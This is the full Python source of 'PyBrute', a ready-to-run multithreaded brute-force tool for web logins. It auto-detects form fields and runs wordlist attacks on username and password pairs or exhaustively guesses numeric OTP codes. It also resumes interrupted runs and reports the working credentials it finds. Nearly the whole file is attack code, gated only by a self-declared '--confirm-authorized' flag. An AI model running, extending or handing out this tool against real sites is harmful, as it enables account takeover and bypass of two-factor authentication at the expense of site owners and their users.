#!/usr/bin/env python3

import requests
import argparse
import sys
import time
import hashlib
import json
import os
import signal
import threading
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, parse_qsl
from bs4 import BeautifulSoup
from datetime import datetime

# =============== GLOBAL VARIABLES ===============
STOP_EVENT = threading.Event()
CHECKPOINT_FILE = '.pybrute_checkpoint'
LOCK = threading.Lock()
OUTPUT_MODE = 'normal'  # 'silent', 'normal', 'verbose'
SESSION = requests.Session()

# Statistik
STATS = {
    'total_tested': 0,
    'start_time': time.time(),
    'candidates': [],
    'success_found': False
}

# =============== OUTPUT MANAGEMENT ===============
def log_output(message, level='normal'):
    """Print based on output mode"""
    if OUTPUT_MODE == 'silent' and level == 'normal':
        return
    if OUTPUT_MODE != 'verbose' and level == 'verbose':
        return
    print(message)

def print_banner():
    banner = r"""
██████╗ ██╗   ██╗██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██║   ██║██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██║   ██║██████╔╝██║   ██║   ██║   █████╗  
██╔═══╝ ██║   ██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  
██║     ╚██████╔╝██║     ╚██████╔╝   ██║   ███████╗
╚═╝      ╚═════╝ ╚═╝      ╚═════╝    ╚═╝   ╚══════╝
         PyBrute Login - Brute Force & Analyzer
    """
    log_output(banner, level='normal')

# =============== FINGERPRINT SYSTEM ===============
def fingerprint(response):
    """Create response fingerprint"""
    body_hash = hashlib.md5(response.text.encode(errors="ignore")).hexdigest()[:8]
    return f"{response.status_code}|{len(response.text)}|{body_hash}"

# =============== FORM ANALYSIS ===============
def analyze_post_params(url, timeout=10):
    """Analyze form and detect parameters"""
    try:
        resp = requests.get(url, timeout=timeout)
        if resp.status_code != 200:
            log_output(f"[-] Cannot access URL {url}. Status: {resp.status_code}", level='normal')
            return None
        
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            log_output("[!] No forms found on the page.", level='normal')
            return None
        
        username_candidates = ['user', 'username', 'email', 'login', 'usr', 'uname']
        password_candidates = ['pass', 'password', 'pwd', 'pswd', 'secret']
        otp_candidates = ['otp', 'code', 'token', 'pin', 'verification', '2fa']
        
        results = []
        
        for i, form in enumerate(forms, start=1):
            log_output(f"\n[+] Form #{i}", level='normal')
            method = form.get('method', 'GET').upper()
            action = form.get('action') or url
            action = urljoin(url, action)
            log_output(f"    Method: {method}", level='normal')
            log_output(f"    Action: {action}", level='normal')
            
            inputs = form.find_all('input')
            if not inputs:
                log_output("    No input fields found.", level='normal')
                continue
            
            log_output("    Input Fields:", level='normal')
            post_data = []
            otp_detected = False
            
            for input_field in inputs:
                name = input_field.get('name') or '(no name)'
                input_type = input_field.get('type', 'text')
                value = input_field.get('value', '')
                placeholder = input_field.get('placeholder', '')
                
                log_output(f"        - Name: {name}, Type: {input_type}, Value: {value}, Placeholder: {placeholder}", level='normal')
                
                if name == '(no name)':
                    continue
                
                lname = name.lower()
                
                # Check for OTP fields
                if any(c in lname for c in otp_candidates):
                    otp_detected = True
                    post_data.append(f"{name}=$pass")
                elif any(c in lname for c in username_candidates):
                    post_data.append(f"{name}=$user")
                elif any(c in lname for c in password_candidates):
                    post_data.append(f"{name}=$pass")
                else:
                    post_data.append(f"{name}={value}")
            
            if method == 'POST':
                post_string = "&".join(post_data)
                log_output(f"\n    [!] POST template for brute force:", level='normal')
                log_output(f"        --post \"{post_string}\"", level='normal')
                
                results.append({
                    'method': method,
                    'action': action,
                    'post_template': post_string,
                    'otp_detected': otp_detected
                })
        
        return results
        
    except Exception as e:
        log_output(f"[-] Error analyzing form: {e}", level='normal')
        return None

# =============== PAYLOAD GENERATION ===============
def generate_otp_list(length=4, start=0, end=None):
    """Generate OTP list from 0000 to 9999"""
    if end is None:
        end = 10 ** length
    return [str(i).zfill(length) for i in range(start, end)]

def read_wordlist(filename):
    """Read wordlist file"""
    if not os.path.exists(filename):
        log_output(f"[-] Wordlist not found: {filename}", level='normal')
        return []
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        log_output(f"[-] Error reading wordlist: {e}", level='normal')
        return []

# =============== REQUEST BUILDING ===============
def build_data_from_template(template, username, password):
    """Build POST data from template"""
    pairs = parse_qsl(template, keep_blank_values=True)
    data = {}
    for k, v in pairs:
        v2 = v.replace('$user', username).replace('$pass', password)
        data[k] = v2
    return data

# =============== SUCCESS DETECTION ===============
def is_success_response(resp, success_string=None, baseline_fp=None):
    """
    Enhanced success detection with fingerprint system
    """
    current_fp = fingerprint(resp)
    
    # Priority 1: Custom success string
    if success_string:
        if success_string in resp.text:
            return True, "custom_success_string", {"string": success_string}
    
    # Priority 2: Status code detection
    if resp.status_code != 200:
        if resp.status_code not in [301, 302, 303, 404]:
            return True, f"unusual_status_{resp.status_code}", {"status": resp.status_code}
    
    # Priority 3: Redirect detection
    if resp.status_code in [301, 302, 303]:
        location = resp.headers.get('Location', '')
        return True, f"redirect_{resp.status_code}", {"location": location}
    
    # Priority 4: Fingerprint change detection
    if baseline_fp and current_fp != baseline_fp:
        return True, "fingerprint_change", {"fingerprint": current_fp}
    
    # Priority 5: New cookie set
    if resp.cookies and len(resp.cookies) > 0:
        cookies = {c.name: c.value for c in resp.cookies}
        return True, "new_cookie_set", {"cookies": cookies}
    
    # Priority 6: Common error keywords absent
    if resp.status_code == 200:
        error_keywords = ['error', 'invalid', 'wrong', 'incorrect', 'failed', 'gagal', 'login gagal']
        text_lower = resp.text.lower()
        
        has_error = any(keyword in text_lower for keyword in error_keywords)
        if not has_error:
            # Check for success indicators
            success_indicators = ['welcome', 'dashboard', 'success', 'logged in', 'logout']
            for indicator in success_indicators:
                if indicator in text_lower:
                    return True, f"success_indicator_{indicator}", {"indicator": indicator}
            
            # If no errors and no clear success indicators, still flag as potential
            return True, "no_error_detected", {"note": "No error keywords found"}
    
    # Priority 7: Flag detection
    if 'flag{' in resp.text.lower() or 'ctf{' in resp.text.lower():
        return True, "flag_detected", {"flag": "Flag pattern found"}
    
    return False, None, None

# =============== ATTACK FUNCTIONS ===============
def test_login(session, url, username, password, post_template, success_string, 
               attempt_number, total_attempts, timeout=10, delay=0, baseline_fp=None):
    """Test single login attempt"""
    global STATS
    
    if STOP_EVENT.is_set():
        return False
    
    try:
        data = build_data_from_template(post_template, username, password)
    except Exception as e:
        log_output(f"[!] Failed to build data: {e}", level='normal')
        return False
    
    try:
        resp = session.post(url, data=data, timeout=timeout, allow_redirects=False)
    except requests.RequestException as e:
        log_output(f"[-] Request error: {e}", level='verbose')
        return False
    
    with LOCK:
        STATS['total_tested'] += 1
    
    # Check success
    success, reason, data = is_success_response(resp, success_string, baseline_fp)
    
    if success:
        with LOCK:
            STATS['success_found'] = True
            STATS['candidates'].append({
                'username': username,
                'password': password,
                'reason': reason,
                'data': data,
                'response': {
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'headers': dict(resp.headers)
                }
            })
        return True
    
    # Progress reporting
    if attempt_number % 100 == 0:
        progress = (attempt_number / total_attempts) * 100 if total_attempts else 0
        elapsed = time.time() - STATS['start_time']
        speed = attempt_number / elapsed if elapsed > 0 else 0
        
        masked_pass = '***' if OUTPUT_MODE != 'verbose' else password
        
        log_output(
            f"\r[+] Progress: {progress:.1f}% | "
            f"Speed: {speed:.1f} req/sec | "
            f"Trying: {username}:{masked_pass}",
            level='normal'
        )
    
    # Add delay if specified
    if delay > 0:
        time.sleep(delay)
    
    return False

# =============== CHECKPOINT SYSTEM ===============
def save_checkpoint(current_index, total, username, password, mode, otp_length=None):
    """Save checkpoint for resume"""
    checkpoint_data = {
        'current_index': current_index,
        'total_attempts': total,
        'last_tried': f"{username}:{password}",
        'mode': mode,
        'timestamp': datetime.now().isoformat(),
        'stats': STATS
    }
    
    if otp_length:
        checkpoint_data['otp_length'] = otp_length
    
    try:
        with open(CHECKPOINT_FILE, 'w') as f:
            json.dump(checkpoint_data, f, indent=2)
    except Exception as e:
        log_output(f"[!] Failed to save checkpoint: {e}", level='normal')

def load_checkpoint():
    """Load checkpoint if exists"""
    if not os.path.exists(CHECKPOINT_FILE):
        return None
    
    try:
        with open(CHECKPOINT_FILE, 'r') as f:
            checkpoint_data = json.load(f)
        return checkpoint_data
    except Exception as e:
        log_output(f"[!] Failed to load checkpoint: {e}", level='normal')
        return None

# =============== MAIN ATTACK FUNCTION ===============
def brute_force_attack(url, username_file, password_file, post_template, 
                      success_string, threads=5, timeout=10, delay=0.0, 
                      resume=False, otp_mode=False, otp_length=4):
    """Main brute force function"""
    global STATS, STOP_EVENT
    
    # Handle OTP mode
    if otp_mode:
        log_output(f"[+] OTP Mode activated - Generating {otp_length}-digit OTPs", level='normal')
        passwords = generate_otp_list(otp_length)
        users = ['otp_user']  # Placeholder
    else:
        # Read wordlists
        if not username_file or not password_file:
            log_output('[!] Username and password files required for normal mode.', level='normal')
            return
        
        users = read_wordlist(username_file)
        passwords = read_wordlist(password_file)
        
        if not users or not passwords:
            log_output('[!] Empty wordlist(s).', level='normal')
            return
    
    total_attempts = len(users) * len(passwords)
    log_output(f"[+] Total combinations: {total_attempts}", level='normal')
    
    # Load checkpoint if resume mode
    start_index = 0
    if resume:
        checkpoint = load_checkpoint()
        if checkpoint:
            start_index = checkpoint.get('current_index', 0)
            STATS = checkpoint.get('stats', STATS)
            log_output(f"[+] Resuming from checkpoint: {checkpoint.get('last_tried', 'N/A')}", level='normal')
            log_output(f"[+] Continuing from attempt #{start_index}/{total_attempts}", level='normal')
    
    # Get baseline fingerprint
    baseline_fp = None
    try:
        if otp_mode:
            test_data = build_data_from_template(post_template, 'otp_user', '0000')
        else:
            test_data = build_data_from_template(post_template, 'wronguser', 'wrongpass')
        
        baseline_resp = SESSION.post(url, data=test_data, timeout=timeout)
        baseline_fp = fingerprint(baseline_resp)
        log_output(f"[+] Baseline fingerprint: {baseline_fp}", level='normal')
    except Exception as e:
        log_output(f"[!] Failed to get baseline: {e}", level='normal')
    
    # Setup signal handler
    def signal_handler(sig, frame):
        log_output('\n[!] Ctrl+C detected - Saving checkpoint...', level='normal')
        STOP_EVENT.set()
        
        if STATS['total_tested'] > 0:
            # Calculate current position
            current_index = min(STATS['total_tested'], total_attempts)
            
            # Find current username:password
            user_idx = (current_index - 1) // len(passwords) % len(users)
            pass_idx = (current_index - 1) % len(passwords)
            
            current_user = users[user_idx] if user_idx < len(users) else users[0]
            current_pass = passwords[pass_idx] if pass_idx < len(passwords) else passwords[0]
            
            save_checkpoint(current_index, total_attempts, current_user, current_pass, 
                          'otp' if otp_mode else 'normal', otp_length if otp_mode else None)
            
            log_output(f'[+] Checkpoint saved to {CHECKPOINT_FILE}', level='normal')
            log_output(f'[+] Use --resume to continue', level='normal')
        
        print_final_stats()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start attack
    session = requests.Session()
    attempt_counter = start_index
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        
        for u in users:
            for p in passwords:
                attempt_counter += 1
                
                # Skip if before checkpoint
                if attempt_counter <= start_index:
                    continue
                
                # Stop if success found
                if STATS['success_found'] or STOP_EVENT.is_set():
                    break
                
                future = executor.submit(
                    test_login, session, url, u, p, post_template, 
                    success_string, attempt_counter, total_attempts, 
                    timeout, delay, baseline_fp
                )
                futures[future] = (u, p, attempt_counter)
                
                # Control submission rate
                if len(futures) >= threads * 2:
                    # Process some futures before submitting more
                    for f in list(futures.keys()):
                        if f.done():
                            try:
                                result = f.result()
                                if result:
                                    STOP_EVENT.set()
                                    break
                            except:
                                pass
                            del futures[f]
                    
                    if STOP_EVENT.is_set():
                        break
            
            if STOP_EVENT.is_set() or STATS['success_found']:
                break
        
        # Wait for remaining futures
        for future in as_completed(futures):
            if future.result():
                STOP_EVENT.set()
                break
    
    # Print results
    print_final_stats()
    
    # Cleanup checkpoint on success
    if STATS['success_found'] and os.path.exists(CHECKPOINT_FILE):
        try:
            os.remove(CHECKPOINT_FILE)
        except:
            pass

def print_final_stats():
    """Print final statistics and results"""
    elapsed = time.time() - STATS['start_time']
    speed = STATS['total_tested'] / elapsed if elapsed > 0 else 0
    
    log_output(f"\n{'='*60}", level='normal')
    log_output("[+] ATTACK COMPLETED", level='normal')
    log_output(f"  Total tested: {STATS['total_tested']}", level='normal')
    log_output(f"  Time elapsed: {elapsed:.2f} seconds", level='normal')
    log_output(f"  Average speed: {speed:.1f} attempts/sec", level='normal')
    
    if STATS['candidates']:
        log_output(f"\n[+] SUCCESSFUL LOGINS FOUND:", level='normal')
        for i, candidate in enumerate(STATS['candidates'], 1):
            log_output(f"\n  Candidate #{i}:", level='normal')
            log_output(f"    Username: {candidate['username']}", level='normal')
            log_output(f"    Password: {candidate['password']}", level='normal')
            log_output(f"    Reason: {candidate['reason']}", level='normal')
            
            resp = candidate['response']
            log_output(f"    Response Status: {resp['status']}", level='normal')
            log_output(f"    Response Length: {resp['length']}", level='normal')
            
            # Show important headers
            if 'headers' in resp:
                headers = resp['headers']
                important = ['Location', 'Set-Cookie', 'Server', 'Content-Type']
                for h in important:
                    if h in headers:
                        log_output(f"    {h}: {headers[h]}", level='normal')
    else:
        log_output(f"\n[-] No successful logins found.", level='normal')
    
    log_output(f"{'='*60}", level='normal')

# =============== MAIN FUNCTION ===============
def main():
    global OUTPUT_MODE
    
    parser = argparse.ArgumentParser(
        description='PyBrute Enhanced - Universal Login Brute Force Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Analyze form
  %(prog)s --url http://example.com/login --analyze
  
  # OTP brute force
  %(prog)s --url http://example.com/otp --otp-mode --post "otp=$pass" --confirm-authorized
  
  # Username/password brute force
  %(prog)s --url http://example.com/login --userlist users.txt --passlist passwords.txt --post "username=$user&password=$pass" --confirm-authorized
  
  # With custom success detection
  %(prog)s --url http://example.com/login --userlist users.txt --passlist passwords.txt --post "username=$user&password=$pass" --success "Welcome" --confirm-authorized
  
  # Silent mode with resume
  %(prog)s --url http://example.com/login --userlist users.txt --passlist passwords.txt --post "username=$user&password=$pass" --silent --resume --confirm-authorized
        """
    )
    
    # Required arguments
    parser.add_argument('--url', required=True, help='Target URL')
    
    # Mode selection
    parser.add_argument('--analyze', action='store_true', help='Analyze forms on the page')
    parser.add_argument('--post', help='POST template (use $user and $pass placeholders)')
    parser.add_argument('--userlist', help='Username wordlist file')
    parser.add_argument('--passlist', help='Password wordlist file')
    parser.add_argument('--otp-mode', action='store_true', help='OTP mode (auto-generate OTPs)')
    parser.add_argument('--otp-length', type=int, default=4, help='OTP length (default: 4)')
    
    # Success detection
    parser.add_argument('--success', help='String that indicates successful login')
    
    # Performance
    parser.add_argument('--threads', type=int, default=5, help='Number of threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('--delay', type=float, default=0.0, help='Delay between requests (default: 0.0)')
    
    # Output control
    parser.add_argument('--silent', action='store_true', help='Silent mode (only show results)')
    parser.add_argument('--verbose', action='store_true', help='Verbose mode (detailed output)')
    
    # Resume
    parser.add_argument('--resume', action='store_true', help='Resume from checkpoint')
    
    # Authorization
    parser.add_argument('--confirm-authorized', action='store_true', 
                       help='Confirm you have authorization to test')
    
    args = parser.parse_args()
    
    # Set output mode
    if args.silent:
        OUTPUT_MODE = 'silent'
    elif args.verbose:
        OUTPUT_MODE = 'verbose'
    else:
        OUTPUT_MODE = 'normal'
    
    print_banner()
    
    # Analyze mode
    if args.analyze:
        analyze_post_params(args.url, args.timeout)
        sys.exit(0)
    
    # Brute-force mode
    if not args.confirm_authorized:
        log_output('[!] You must confirm authorization with --confirm-authorized', level='normal')
        sys.exit(1)
    
    if not args.post:
        log_output('[!] POST template is required (use --post)', level='normal')
        sys.exit(1)
    
    # Validate mode
    if args.otp_mode:
        log_output(f'[+] OTP mode: generating {10**args.otp_length} OTPs', level='normal')
    else:
        if not args.userlist or not args.passlist:
            log_output('[!] For normal mode, --userlist and --passlist are required', level='normal')
            sys.exit(1)
    
    # Run attack
    brute_force_attack(
        url=args.url,
        username_file=args.userlist,
        password_file=args.passlist,
        post_template=args.post,
        success_string=args.success,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        resume=args.resume,
        otp_mode=args.otp_mode,
        otp_length=args.otp_length
    )

if __name__ == '__main__':
    main()
